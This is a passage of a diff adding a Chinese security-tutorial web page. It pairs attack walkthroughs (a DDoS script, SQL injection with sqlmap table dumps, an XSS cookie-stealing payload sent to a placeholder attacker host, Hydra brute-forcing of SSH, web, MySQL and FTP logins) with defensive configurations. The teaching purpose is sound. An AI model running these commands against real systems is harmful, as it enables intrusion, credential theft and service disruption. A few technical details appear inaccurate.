+                <p>切换到下载后的DDOS工具根目录，为运行脚本做准备，<strong>注释</strong>：cd为目录切换指令，进入工具工作目录：</p>
+                <pre>
+# 进入DDOS工具根目录
+cd DDOS
+                </pre>
+                <h4>4. 运行DDoS核心脚本</h4>
+                <p>调用Python2解释器运行ddos.py脚本，启动工具交互式界面，<strong>注释</strong>：该脚本仅支持Python2，不可用Python3运行：</p>
+                <pre>
+# 运行经典DDoS攻击核心脚本，启动交互式配置界面
+python2 ddos.py
+                </pre>
+                <h4>5. 工具交互式配置（仅合法环境）</h4>
+                <p>脚本运行后将出现以下交互提示，<strong>仅可输入自己拥有合法权限的目标IP/域名、端口</strong>，端口范围遵循TCP/IP协议规范（0~65535）：</p>
+                <pre>
+# 第一步：输入目标IP/域名，示例：192.168.1.100（自身内网服务器）/localhost
+[*] IP or HOSTNAME: 192.168.1.100
+# 第二步：输入端口范围，示例：80-443（HTTP/HTTPS端口，仅测试自身开放端口）
+[*] 端口扫描参数0~65535之间：80-443
+                </pre>
+                <h4>6. 停止脚本运行</h4>
+                <p>若需终止DDoS脚本的流量发送，终端按下组合键，<strong>注释</strong>：强制终止当前运行的Python进程，适用于所有Linux/Termux环境：</p>
+                <pre>
+# 通用进程终止组合键，按下后立即停止脚本运行
+CTRL + C
+                </pre>
+                <h3>三、DDoS攻击针对性防护方案（核心重点）</h3>
+                <p>学习DDoS工具的核心目的是掌握防护方法，以下为针对该经典脚本的多层防护方案，含Kali/Linux/服务器端实操指令，详细注释：</p>
+                <h4>1. 网络层防护（iptables防火墙，Linux服务器）</h4>
+                <p>通过iptables限制单IP连接数、请求频率，封禁恶意流量，<strong>注释</strong>：所有指令均在Linux防护服务器执行，逐行运行：</p>
+                <pre>
+# 允许回环接口，保证服务器本地通信
+iptables -A INPUT -i lo -j ACCEPT
+# 允许已建立的连接，保证合法用户正常访问
+iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+# 限制单IP的SYN连接数（每秒最多10个），防御SYN洪水
+iptables -A INPUT -p tcp --syn -m limit --limit 10/s --limit-burst 20 -j ACCEPT
+iptables -A INPUT -p tcp --syn -j DROP
+# 限制单IP的ICMP请求（每秒最多5个），防御ICMP洪水
+iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 5/s --limit-burst 10 -j ACCEPT
+iptables -A INPUT -p icmp --icmp-type echo-request -j DROP
+# 限制单IP的TCP连接数最多5个，防止连接耗尽型DDoS
+iptables -A INPUT -p tcp -m connlimit --connlimit-above 5 -j DROP
+# 保存iptables规则（Debian/Ubuntu）
+iptables-save > /etc/iptables/rules.v4
+# 保存iptables规则（CentOS）
+service iptables save
+                </pre>
+                <h4>2. 应用层防护（Nginx限流，针对80/443端口）</h4>
+                <p>编辑Nginx配置文件，添加请求限流规则，防止应用层CC攻击，<strong>注释</strong>：适用于所有搭建Nginx的Web服务器：</p>
+                <pre>
+# 编辑Nginx主配置文件
+vim /etc/nginx/nginx.conf
+# 在http模块中添加限流规则，定义：每秒最多10个请求，缓冲区100个
+limit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;
+# 在server模块中应用限流规则
+server {
+    listen 80;
+    listen 443 ssl;
+    server_name 192.168.1.100; # 自身服务器IP/域名
+    # 对所有请求应用限流规则
+    location / {
+        limit_req zone=one burst=10 nodelay;
+        root /usr/share/nginx/html;
+        index index.html;
+    }
+}
+# 重启Nginx使规则生效
+systemctl restart nginx
+# 验证Nginx配置是否正确
+nginx -t
+                </pre>
+                <h4>3. 应急防护措施</h4>
+                <ul>
+                    <li>及时联系服务商：开启高防IP/高防服务器，将流量引流到高防节点清洗恶意流量；</li>
+                    <li>暂停非核心服务：关闭暂时不需要的端口/服务，集中资源保障核心业务；</li>
+                    <li>日志分析：使用grep/awk分析Nginx/系统日志，定位攻击源IP，为封禁提供依据；</li>
+                    <li>上报公安机关：若DDoS攻击造成重大损失，及时向网络安全部门报警处理。</li>
+                </ul>
+                <h4>4. 生产环境终极防护方案</h4>
+                <p>真实生产环境中，需配合多层防护体系：<strong>CDN（隐藏源IP）+ WAF（Web应用防火墙）+ 高防服务器 + 云防火墙</strong>，从源头拦截DDoS流量。</p>
+            </div>
+
+            <!-- SQL注入原理与防护 -->
+            <div class="tutorial-section" id="sql">
+                <button class="collect-btn" data-id="tutorial_2" data-title="SQL注入原理与防护"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-database"></i> SQL注入原理与防护（Kali实操版）</h2>
+                <div class="tip-warning">
+                    <strong>重要提示</strong>：利用SQL注入攻击他人数据库属于违法行为，本章节仅讲解SQL注入的原理、Kali工具检测方法和防护方案，所有测试需在自己的合法环境中进行。
+                </div>
+                <h3>一、SQL注入核心原理</h3>
+                <p>SQL注入是指攻击者在Web应用的输入参数中插入恶意的SQL语句，当应用程序未对输入进行过滤时，恶意SQL语句会被数据库执行，导致数据泄露、篡改甚至服务器被控制。核心原因是**直接拼接用户输入到SQL语句中，未做任何过滤验证**。</p>
+                <h4>1. 经典脆弱代码示例（PHP）</h4>
+                <p><strong>注释</strong>：以下代码为存在SQL注入漏洞的典型写法，禁止在生产环境使用：</p>
+                <pre>
+# 未过滤用户输入，直接通过GET获取id参数
+$id = $_GET['id'];
+# 直接拼接用户输入到SQL语句中，存在严重SQL注入漏洞
+$sql = "SELECT * FROM users WHERE id = $id";
+$result = mysqli_query($conn, $sql);
+                </pre>
+                <h4>2. 经典注入利用示例</h4>
+                <p>攻击者构造恶意请求，使SQL语句恒成立，查询出所有用户数据，<strong>注释</strong>：仅展示原理，严禁非法使用：</p>
+                <pre>
+# 正常请求：http://192.168.1.100/user.php?id=1
+# 恶意注入请求：拼接OR 1=1（恒成立）
+http://192.168.1.100/user.php?id=1 OR 1=1
+# 执行后的SQL语句：查询出users表中所有数据
+SELECT * FROM users WHERE id = 1 OR 1=1;
+                </pre>
+                <h3>二、Kali Linux检测SQL注入漏洞（SQLMap，仅合法环境）</h3>
+                <p>SQLMap是Kali Linux自带的经典SQL注入检测工具，可自动化检测、利用SQL注入漏洞，以下为<strong>仅合法环境</strong>的实操步骤，详细注释：</p>
+                <h4>1. 启动Kali Linux并验证SQLMap</h4>
+                <pre>
+# 打开Kali终端，验证SQLMap是否安装（Kali自带，无需额外安装）
+sqlmap -h
+# 查看SQLMap版本，确认工具可用
+sqlmap --version
+                </pre>
+                <h4>2. 基础检测指令（单URL检测）</h4>
+                <p>检测指定URL是否存在SQL注入漏洞，<strong>注释</strong>：仅可输入自己合法开发的Web应用URL：</p>
+                <pre>
+# 基础检测指令，-u指定目标URL，--batch表示自动确认所有选项
+sqlmap -u "http://192.168.1.100/user.php?id=1" --batch
+# 检测并列出数据库名，--dbs表示列出所有数据库
+sqlmap -u "http://192.168.1.100/user.php?id=1" --dbs --batch
+# 检测并列出指定数据库的表名，-D指定数据库名，--tables表示列出表
+sqlmap -u "http://192.168.1.100/user.php?id=1" -D testdb --tables --batch
+# 检测并列出指定表的字段，
+# 检测并列出指定表的字段，-T指定表名，--columns表示列出字段
+sqlmap -u "http://192.168.1.100/user.php?id=1" -D testdb -T users --columns --batch
+# 导出指定表的所有数据，--dump表示导出数据
+sqlmap -u "http://192.168.1.100/user.php?id=1" -D testdb -T users --dump --batch
+                </pre>
+                <h4>3. 高级检测指令（POST请求/Cookie注入）</h4>
+                <pre>
+# 检测POST请求注入（--data指定POST参数）
+sqlmap -u "http://192.168.1.100/login.php" --data "username=admin&password=123" --batch
+# 检测Cookie注入（--cookie指定Cookie值）
+sqlmap -u "http://192.168.1.100/index.php" --cookie "PHPSESSID=abc123; user_id=1" --batch
+# 开启暴力破解表名/字段名（--brute）
+sqlmap -u "http://192.168.1.100/user.php?id=1" --brute --batch
+                </pre>
+                <h3>三、SQL注入全方位防护方案（实操版）</h3>
+                <h4>1. 核心防护：参数化查询（预编译语句）</h4>
+                <p>从根本上杜绝SQL注入，将用户输入作为参数传递，而非直接拼接，以下为PHP/Java实操示例，带详细注释：</p>
+                <pre>
+# PHP(PDO)参数化查询示例，支持所有数据库
+$id = $_GET['id']; # 获取用户输入
+# 初始化PDO连接数据库
+$pdo = new PDO("mysql:host=localhost;dbname=testdb", "root", "123456");
+# 预编译SQL语句，:id为参数占位符
+$stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
+# 绑定参数并指定类型（PDO::PARAM_INT表示整数）
+$stmt->bindParam(':id', $id, PDO::PARAM_INT);
+# 执行预编译语句
+$stmt->execute();
+# 获取查询结果
+$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
+
+# Java(JDBC)参数化查询示例
+String id = request.getParameter("id"); # 获取用户输入
+String sql = "SELECT * FROM users WHERE id = ?"; # ?为参数占位符
+# 预编译SQL语句
+PreparedStatement pstmt = conn.prepareStatement(sql);
+# 绑定参数（1表示第一个占位符，Integer.parseInt(id)转换为整数）
+pstmt.setInt(1, Integer.parseInt(id));
+# 执行查询
+ResultSet rs = pstmt.executeQuery();
+                </pre>
+                <h4>2. 辅助防护：输入过滤与验证</h4>
+                <p>对用户输入进行严格过滤，仅允许合法字符/格式，PHP实操示例：</p>
+                <pre>
+# 过滤数字以外的字符（适用于ID等数字参数）
+$id = preg_replace('/[^0-9]/', '', $_GET['id']);
+# 验证邮箱格式
+$email = $_GET['email'];
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    die("非法邮箱格式，拒绝访问！");
+}
+# 过滤SQL特殊字符（单引号、分号、注释符等）
+function filter_sql($str) {
+    $special_chars = array("'", "\"", ";", "--", "/*", "*/");
+    return str_replace($special_chars, "", $str);
+}
+$username = filter_sql($_POST['username']);
+                </pre>
+                <h4>3. 权限防护：数据库最小权限原则</h4>
+                <pre>
+# 1. 创建仅拥有查询/插入/更新权限的数据库账号（MySQL）
+CREATE USER 'web_user'@'localhost' IDENTIFIED BY 'Web@123456';
+# 仅授予testdb数据库的users表查询/插入/更新权限
+GRANT SELECT, INSERT, UPDATE ON testdb.users TO 'web_user'@'localhost';
+# 禁止授予DROP/ALTER/DELETE等高危权限
+FLUSH PRIVILEGES; # 刷新权限
+
+# 2. 禁止使用root账号连接Web应用
+# Web应用配置文件中使用web_user账号，而非root
+$pdo = new PDO("mysql:host=localhost;dbname=testdb", "web_user", "Web@123456");
+                </pre>
+                <h4>4. 设备防护：WAF拦截SQL注入</h4>
+                <p>开源WAF（ModSecurity）配置示例，拦截SQL注入特征请求：</p>
+                <pre>
+# 编辑ModSecurity配置文件（/etc/modsecurity/modsecurity.conf）
+SecRuleEngine On # 开启规则引擎
+SecRule REQUEST_URI|ARGS "union.*select|insert.*into|delete.*from|drop.*table" "id:10001,deny,status:403,msg:'SQL注入攻击被拦截 - 枫叶安全'"
+SecRule REQUEST_URI|ARGS "or 1=1|and 1=1|sleep\(|benchmark\(" "id:10002,deny,status:403,msg:'SQL注入恶意函数被拦截 - 枫叶安全'"
+# 重启Apache/Nginx使配置生效
+systemctl restart apache2
+systemctl restart nginx
+                </pre>
+            </div>
+
+            <!-- XSS跨站脚本攻击原理与防护 -->
+            <div class="tutorial-section" id="xss">
+                <button class="collect-btn" data-id="tutorial_3" data-title="XSS跨站脚本攻击原理与防护"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-code"></i> XSS跨站脚本攻击原理与防护（Kali/Burp实操版）</h2>
+                <div class="tip-warning">
+                    <strong>重要提示</strong>：利用XSS攻击窃取用户Cookie、钓鱼、伪造操作等行为属于违法犯罪，本章节仅讲解XSS原理、Kali/Burp检测方法和防护方案，严禁用于非法用途。
+                </div>
+                <h3>一、XSS攻击核心原理与分类</h3>
+                <p>XSS（跨站脚本）攻击是指攻击者在Web页面中注入恶意JavaScript代码，当用户访问该页面时，恶意代码会在用户浏览器中执行，从而窃取用户信息、伪造用户操作。核心原因是**应用未对用户输入进行过滤/编码，直接将输入输出到页面**。</p>
+                <h4>1. XSS三大分类</h4>
+                <ul>
+                    <li><strong>反射型XSS</strong>：恶意代码通过URL参数传递，仅对当前访问用户生效，如搜索框、留言板未过滤输入；</li>
+                    <li><strong>存储型XSS</strong>：恶意代码被存储到数据库（如评论、文章、用户资料），所有访问该页面的用户都会执行，危害最大；</li>
+                    <li><strong>DOM型XSS</strong>：恶意代码通过修改页面DOM结构执行，不经过服务器，仅在浏览器端生效。</li>
+                </ul>
+                <h4>2. 经典反射型XSS示例</h4>
+                <p>PHP脆弱代码（未过滤输入，直接输出）：</p>
+                <pre>
+# 未过滤用户输入，直接通过GET获取name参数
+$name = $_GET['name'];
+# 直接将用户输入输出到页面，存在严重反射型XSS漏洞
+echo "欢迎你，$name！";
+                </pre>
+                <p>攻击者构造恶意请求，注入JS代码：</p>
+                <pre>
+# 正常请求：http://192.168.1.100/hello.php?name=枫叶安全
+# 恶意XSS请求：注入弹窗代码
+http://192.168.1.100/hello.php?name=&lt;script&gt;alert('XSS攻击-枫叶安全');&lt;/script&gt;
+# 注入窃取Cookie代码（非法用途，仅展示原理）
+http://192.168.1.100/hello.php?name=&lt;script&gt;document.location='http://攻击者IP/steal.php?cookie='+document.cookie;&lt;/script&gt;
+                </pre>
+                <h3>二、Kali/Burp Suite检测XSS漏洞（仅合法环境）</h3>
+                <h4>1. Burp Suite基础抓包检测（最常用）</h4>
+                <p>Burp Suite是Kali自带的Web漏洞检测工具，以下为XSS检测实操步骤，带详细注释：</p>
+                <ol>
+                    <li>启动Burp Suite：Kali终端输入<code>burpsuite</code>，选择默认配置启动；</li>
+                    <li>配置代理：<code>Proxy</code>→<code>Options</code>，设置监听地址<code>127.0.0.1:8080</code>，勾选<code>Running</code>；</li>
+                    <li>配置浏览器代理：将Kali浏览器代理指向<code>127.0.0.1:8080</code>；</li>
+                    <li>安装Burp证书：访问<code>http://burp/cert</code>，下载并安装证书（解决HTTPS抓包）；</li>
+                    <li>抓包检测：访问目标Web应用（自身合法应用），在输入框输入<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，Burp捕获请求后，右键→<code>Send to Scanner</code>，自动检测XSS漏洞；</li>
+                    <li>查看结果：<code>Scanner</code>→<code>Results</code>，查看是否存在XSS漏洞，高危漏洞会标注<code>Cross-site scripting (reflected)</code>。</li>
+                </ol>
+                <h4>2. Kali XSS检测工具（XSSer）实操</h4>
+                <p>XSSer是Kali自带的XSS专用检测工具，自动化注入测试，指令示例带注释：</p>
+                <pre>
+# 启动Kali终端，验证XSSer
+xsser -h
+# 基础检测反射型XSS（-u指定目标URL，-p指定参数）
+xsser -u "http://192.168.1.100/hello.php" -p "name" --batch
+# 检测存储型XSS（--post指定POST参数，-d指定数据）
+xsser -u "http://192.168.1.100/comment.php" --post -d "content=test&submit=1" -p "content" --batch
+# 开启强力检测模式（--powerful）
+xsser -u "http://192.168.1.100/hello.php" -p "name" --powerful --batch
+                </pre>
+                <h3>三、XSS全方位防护方案（实操版，核心）</h3>
+                <h4>1. 核心防护：输入过滤 + 输出编码</h4>
+                <p>将用户输入的特殊字符转换为HTML实体，使浏览器无法解析为JS代码，PHP/JavaScript实操示例：</p>
+                <pre>
+# PHP输出编码（最常用，htmlspecialchars转换所有特殊字符）
+$name = $_GET['name'];
+# ENT_QUOTES表示转换单引号和双引号，UTF-8指定编码
+$name = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
+# 过滤HTML标签（strip_tags，可选）
+$name = strip_tags($name);
+# 编码后输出到页面，彻底杜绝XSS
+echo "欢迎你，$name！";
+
+# JavaScript输出编码（前端防护，双重保障）
+function escapeHtml(unsafe) {
+    // 将特殊字符转换为HTML实体
+    return unsafe
+         .replace(/&/g, "&amp;")
+         .replace(/</g, "&lt;")
+         .replace(/>/g, "&gt;")
+         .replace(/"/g, "&quot;")
+         .replace(/'/g, "&#039;");
+}
+// 编码后再插入页面
+var userInput = getUrlParam("name"); // 获取URL参数
+document.getElementById("name").innerText = escapeHtml(userInput);
+// 禁止使用innerHTML（直接插入HTML，易触发XSS）
+// document.getElementById("name").innerHTML = userInput; // 禁止使用
+                </pre>
+                <h4>2. 高级防护：配置CSP（内容安全策略）</h4>
+                <p>CSP限制页面加载的资源来源、禁止内联脚本/eval函数，从根本上防御XSS，Nginx/Apache配置示例：</p>
+                <pre>
+# Nginx配置CSP（添加到server模块）
+add_header Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.bootcdn.net; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-src 'none'; base-uri 'self';" always;
+# 解释：
+# default-src 'self'：默认仅允许加载自身域名资源
+# script-src 'self' CDN：仅允许加载自身和指定CDN的JS
+# object-src 'none'：禁止加载插件（Flash等）
+# frame-src 'none'：禁止嵌套iframe，防御点击劫持
+
+# Apache配置CSP（.htaccess文件）
+Header set Content-Security-Policy "default-src 'self'; script-src 'self' https://cdn.bootcdn.net; style-src 'self' 'unsafe-inline'; img-src 'self' data:; object-src 'none'; frame-src 'none';"
+# 重启Nginx/Apache使配置生效
+systemctl restart nginx
+systemctl restart apache2
+                </pre>
+                <h4>3. 关键防护：设置Cookie HttpOnly属性</h4>
+                <p>HttpOnly属性禁止JavaScript读取Cookie，即使存在XSS漏洞，攻击者也无法窃取Cookie，PHP/Nginx配置示例：</p>
+                <pre>
+# PHP设置HttpOnly Cookie（单个Cookie）
+# 最后一个true表示开启HttpOnly
+setcookie('user_id', '123', time()+3600, '/', '', false, true);
+# PHP设置Session Cookie为HttpOnly（php.ini或代码）
+ini_set('session.cookie_httponly', 1); # 代码中设置
+# php.ini配置（永久生效）
+session.cookie_httponly = On
+
+# Nginx全局设置HttpOnly Cookie（添加到server模块）
+proxy_cookie_path / "/; HttpOnly; Secure";
+# Secure表示仅在HTTPS下传输Cookie，双重保障
+                </pre>
+                <h4>4. 辅助防护：输入验证与白名单</h4>
+                <pre>
+# PHP限制输入长度（评论最多500字符）
+$content = $_POST['content'];
+if (strlen($content) > 500) {
+    die("输入内容过长，最多允许500个字符！");
+}
+# PHP验证输入格式（用户名仅允许字母、数字、下划线）
+$username = $_POST['username'];
+if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
+    die("用户名仅允许字母、数字、下划线，3-20个字符！");
+}
+# 仅允许合法HTML标签（如<b>、<i>），过滤所有脚本标签
+function filter_html($str) {
+    $allowed_tags = '<b><i><u><em><strong>';
+    return strip_tags($str, $allowed_tags);
+}
+$comment = filter_html($_POST['comment']);
+                </pre>
+            </div>
+
+            <!-- 暴力破解原理与防护 -->
+            <div class="tutorial-section" id="brute">
+                <button class="collect-btn" data-id="tutorial_4" data-title="暴力破解原理与防护"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-unlock-alt"></i> 暴力破解原理与防护（Kali/Hydra实操版）</h2>
+                <div class="tip-warning">
+                    <strong>重要提示</strong>：对他人账号、服务器、数据库进行暴力破解属于违法行为，本章节仅讲解暴力破解原理、Kali工具检测方法和防护方案，所有测试需在自己的合法环境中进行。
+                </div>
+                <h3>一、暴力破解核心原理</h3>
+                <p>暴力破解是指攻击者使用自动化工具，尝试大量的用户名/密码组合，直到匹配到正确的凭证，核心依赖**弱密码**和**无登录限制**。常见攻击目标：Web登录页面、SSH/RDP/FTP、数据库、API接口。</p>
+                <p>经典暴力破解工具：Kali自带Hydra（九头蛇）、Burp Suite、Medusa、Ncrack，其中Hydra最常用，支持多种协议破解。</p>
+                <h3>二、Kali Hydra暴力破解实操（仅合法环境）</h3>
+                <p>Hydra是Kali自带的万能暴力破解工具，支持SSH/FTP/HTTP/MySQL等数十种协议，以下为实操指令，带详细注释，<strong>仅可测试自身合法设备/服务器</strong>：</p>
+                <h4>1. Hydra基础指令（查看帮助）</h4>
+                <pre>
+# 启动Kali终端，查看Hydra帮助
+hydra -h
+# 查看指定协议的破解参数（如ssh）
+hydra -U ssh
+# 查看HTTP表单破解参数
+hydra -U http-form-post
+                </pre>
+                <h4>2. 破解SSH服务（最常用，Linux服务器）</h4>
+                <pre>
+# 破解SSH（-l指定单个用户名，-P指定密码字典，-t指定线程数，-vV显示详细过程，-o保存结果）
+hydra -l root -P /usr/share/wordlists/rockyou.txt -t 10 -vV -o ssh_brute.txt ssh://192.168.1.100:22
+# 解释：
+# /usr/share/wordlists/rockyou.txt：Kali自带密码字典，需解压（gunzip /usr/share/wordlists/rockyou.txt.gz）
+# -t 10：10线程，避免线程过多被拦截
+# ssh://192.168.1.100:22：目标SSH服务器IP+端口
+
+# 破解多个用户名（-L指定用户名字典）
+hydra -L user.txt -P pass.txt -t 5 -vV ssh://192.168.1.100:22
+                </pre>
+                <h4>3. 破解Web登录表单（HTTP POST）</h4>
+                <p>需先通过Burp Suite捕获登录请求，获取POST参数、成功/失败标识，示例带注释：</p>
+                <pre>
+# 破解Web登录表单（http-form-post，关键参数：form-data、success/failure标识）
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 5 -vV -o web_brute.txt 192.168.1.100 http-form-post "/login.php:username=^USER^&password=^PASS^&submit=登录:用户名或密码错误"
+# 解释：
+# /login.php：登录页面路径
+# username=^USER^&password=^PASS^：POST参数，^USER^/^PASS^为Hydra占位符
+# 用户名或密码错误：登录失败的提示信息（Hydra根据此判断是否破解成功）
+                </pre>
+                <h4>4. 破解MySQL数据库</h4>
+                <pre>
+# 破解MySQL数据库（-l用户名，-P密码字典，-p端口，默认3306）
+hydra -l root -P /usr/share/wordlists/rockyou.txt -t 3 -vV -o mysql_brute.txt 192.168.1.100 mysql -s 3306
+                </pre>
+                <h4>5. 破解FTP服务</h4>
+                <pre>
+# 破解FTP服务（默认端口21）
+hydra -l ftpuser -P pass.txt -t 5 -vV -o ftp_brute.txt 192.168.1.100 ftp
+                </pre>
+                <h3>三、暴力破解全方位防护方案（实操版，核心）</h3>
+                <h4>1. 核心防护：限制登录尝试次数</h4>
+                <p>对同一账号/IP的登录尝试次数进行限制，达到阈值后暂时封禁，PHP实操示例（Web登录）：</p>
+                <pre>
+session_start(); # 初始化Session
+# 初始化登录失败次数和封禁时间
+if (!isset($_SESSION['login_attempts'])) {
+    $_SESSION['login_attempts'] = 0;
+    $_SESSION['block_time'] = 0;
+}
+# 检查是否处于封禁期（10分钟=600秒）
+if (time() < $_SESSION['block_time']) {
+    $left_time = $_SESSION['block_time'] - time();
+    die("登录失败次数过多，请{$left_time}秒后再试！-枫叶安全");
+}
+# 验证用户名和密码
+if ($_POST['username'] && $_POST['password']) {
+    if (check_login($_POST['username'], $_POST['password'])) { # 自定义验证函数
+        $_SESSION['login_attempts'] = 0; # 登录成功，重置失败次数
+        header("Location: dashboard.php");
+        exit;
+    } else {
+        $_SESSION['login_attempts']++; # 登录失败，增加次数
+        # 失败5次，封禁10分钟
+        if ($_SESSION['login_attempts'] >= 5) {
+            $_SESSION['block_time'] = time() + 600;
+            die("登录失败5次，账号封禁10分钟！-枫叶安全");
+        }
+        $left_attempts = 5 - $_SESSION['login_attempts'];
+        die("用户名或密码错误，剩余尝试次数：{$left_attempts} -枫叶安全");
+    }
+}
+                </pre>
+                <h4>2. 根本防护：强化密码策略（禁止弱密码）</h4>
+                <p>强制用户设置强密码，PHP密码复杂度检测示例，同时服务器/数据库/SSH禁止使用弱密码：</p>
+                <pre>
+# PHP密码复杂度检测函数（至少8位，含大小写字母、数字、特殊字符）
+function check_password_strength($password) {
+    if (strlen($password) < 8) return false; # 长度≥8
+    if (!preg_match('/[A-Z]/', $password)) return false; # 含大写字母
+    if (!preg_match('/[a-z]/', $password)) return false; # 含小写字母
+    if (!preg_match('/[0-9]/', $password)) return false; # 含数字
+    if (!preg_match('/[^a-zA-Z0-9]/', $password)) return false; # 含特殊字符
+    return true;
+}
+# 使用示例
+$password = $_POST['password'];
+if (!check_password_strength($password)) {
+    die("密码强度不足！要求：至少8位，含大小写字母、数字、特殊字符（!@#$%^&*）-枫叶安全");
+}
+# 服务器SSH禁止弱密码：修改/etc/ssh/sshd_config，添加PasswordAuthentication no（仅密钥登录）
+                </pre>
+                <h4>3. 高级防护：启用双因素认证（2FA）</h4>
+                <p>双因素认证需要用户除了密码外，还需提供第二种验证方式（手机验证码、谷歌验证器、UKey），即使密码被破解，攻击者也无法登录，PHP谷歌验证器（TOTP）实操示例：</p>
+                <pre>
+# 1. 安装依赖（Composer）
+composer require pragmarx/google2fa
+# 2. 生成密钥和二维码（用户扫码绑定）
+use PragmaRX\Google2FA\Google2FA;
+$google2fa = new Google2FA();
+$secret = $google2fa->generateSecretKey(); # 生成唯一密钥，存储到用户表
+# 生成二维码URL（用户使用谷歌验证器扫码绑定）
+$qrCodeUrl = $google2fa->getQRCodeUrl(
+    '枫叶安全管理系统', # 应用名称
+    'user@fengye.com',   # 用户邮箱
+    $secret              # 生成的密钥
+);
+# 3. 验证验证码（登录时）
+$code = $_POST['2fa_code']; # 用户输入的6位验证码
+$valid = $google2fa->verifyKey($secret, $code); # 验证
+if ($valid) {
+    # 验证通过，允许登录
+} else {
+    die("双因素认证验证码错误！-枫叶安全");
+}
+                </pre>
+                <h4>4. SSH暴力破解专属防护（Linux服务器，核心）</h4>
+                <p>SSH是暴力破解的高频目标，以下为Linux服务器SSH防护实操，多管齐下：</p>
+                <pre>
+# 1. 禁用root直接登录SSH（编辑/etc/ssh/sshd_config）
+PermitRootLogin no # 禁止root登录
+# 2. 修改SSH默认端口（从22改为2222，降低被扫描概率）
+Port 2222
+# 3. 禁用密码登录，仅允许密钥登录（最安全）
+PasswordAuthentication no
+PubkeyAuthentication yes
+# 4. 重启SSH服务使配置生效
+systemctl restart sshd
+# 5. 安装fail2ban，自动封禁多次失败的IP
+apt install fail2ban -y # Debian/Ubuntu
+yum install fail2ban -y # CentOS
+# 配置fail2ban（/etc/fail2ban/jail.local）
+[sshd]
+enabled = true
+port = 2222 # 自定义的SSH端口
+filter = sshd
+logpath = /var/log/auth.log
+maxretry = 3 # 失败3次封禁
+bantime = 3600 # 封禁1小时
+# 启动fail2ban并设置开机自启
+systemctl start fail2ban
+systemctl enable fail2ban
+# 查看fail2ban状态，查看封禁的IP
+fail2ban-client status sshd
+# 解封指定IP
+fail2ban-client set sshd unbanip 192.168.1.xxx
+                </pre>
+                <h4>5. 辅助防护：日志监控与实时告警</h4>
+                <p>记录所有登录尝试，设置告警规则，发现异常暴力破解及时处理，Linux日志分析示例：</p>
+                <pre>
+# 查看SSH登录失败日志（/var/log/auth.log）
+grep "Failed password" /var/log/auth.log
+# 统计某个IP的登录失败次数
+grep "Failed password from 192.168.1.xxx" /var/log/auth.log | wc -l
+# 查看Web登录失败日志（Nginx）
+grep "用户名或密码错误" /var/log/nginx/access.log
+# 设置定时任务告警：单IP10分钟内失败5次，发送邮件告警（需配置邮件服务）
+# 编辑crontab：crontab -e
+*/10 * * * * /bin/bash /root/ssh_alert.sh
+# ssh_alert.sh脚本（检测失败次数，超过5次发送邮件）
+#!/bin/bash
+FAIL_COUNT=$(grep "Failed password" /var/log/auth.log | grep -E "$(date +%Y-%m-%d\ %H):[0-9]{2}" | wc -l)
+if [ $FAIL_COUNT -ge 5 ]; then
+    echo "SSH暴力破解告警：$(date)，失败次数：$FAIL_COUNT" | mail -s "SSH暴力破解告警-枫叶安全" admin@fengye.com
+fi
+                </pre>
+            </div>
+
+            <!-- 合法漏洞扫描 -->
+            <div class="tutorial-section" id="scan">
+                <button class="collect-btn" data-id="tutorial_5" data-title="合法漏洞扫描"><i class="fa fa-star-o"></i> 收藏教程</button>
+                <h2><i class="fa fa-search-plus"></i> 合法漏洞扫描（Kali全套工具实操，仅自身环境）</h2>
+                <div class="tip-danger">
+                    <strong>重要提示</strong>：未经授权扫描他人服务器/网站/设备的漏洞属于违法行为，所有扫描操作必须在自己拥有合法权限的设备/服务器/应用上进行，否则将承担相应法律责任。
+                </div>
+                <h3>一、漏洞扫描核心原则</h3>
+                <ul>
+                    <li><strong>授权原则</strong>：仅扫描自己的资产，或获得书面授权的目标，无授权不扫描；</li>
+                    <li><strong>最小影响原则</strong>：避免使用高风险扫描方式（如DoS测试），防止影响服务器正常运行；</li>
+                    <li><strong>记录原则</strong>：详细记录扫描结果，包括漏洞类型、风险等级、修复建议；</li>
+                    <li><strong>修复原则</strong>：发现漏洞后及时修复，并验证修复效果，形成闭环。</li>
+                </ul>
+                <h3>二、Kali经典漏洞扫描工具实操（全套，带注释）</h3>
+                <h4>1. Nmap（端口/服务扫描，基础中的基础）</h4>
+                <p>Nmap是Kali自带的端口扫描神器，可扫描服务器开放的端口、运行的服务版本、操作系统类型，发现未授权开放的高危端口，实操指令带注释：</p>
+                <pre>
+# 快速端口扫描（扫描1-10000常用端口，-T4快速模式，-F精简扫描）
+nmap -T4 -F 192.168.1.100
+# 全端口扫描（扫描0-65535所有端口，-p-表示所有端口）
+nmap -T4 -p- 192.168.1.100
+# 检测服务版本和操作系统（-sV服务版本，-O操作系统）
+nmap -T4 -p 22,80,443,3306 -sV -O 192.168.1.100
+# 扫描指定网段的所有设备（192.168.1.0/24）
+nmap -T4 -F 192.168.1.0/24
+# 保存扫描结果（-oN普通文本，-oXXML，-oG grep格式）
+nmap -T4 -F 192.168.1.100 -oN nmap_scan.txt
+# 扫描结果分析：重点关注开放的高危端口（如22、3306、8080），以及服务版本是否存在已知漏洞
+                </pre>
+                <h4>2. OpenVAS（开源全功能漏洞扫描器，企业级）</h4>
+                <p>OpenVAS是Kali自带的开源漏洞扫描器，包含海量漏洞检测插件，支持网络设备、服务器、Web应用的全维度扫描，实操步骤带注释：</p>
+                <pre>
+# 1. 安装OpenVAS（Kali终端）
+apt update && apt upgrade -y
+apt install openvas -y
+# 2. 初始化OpenVAS（生成证书、创建管理员账号）
+openvas-setup
+# 初始化过程中会生成管理员账号和密码，务必记录！
+# 3. 启动OpenVAS服务
+systemctl start openvas
+# 4. 访问Web界面（默认端口9392，HTTPS）
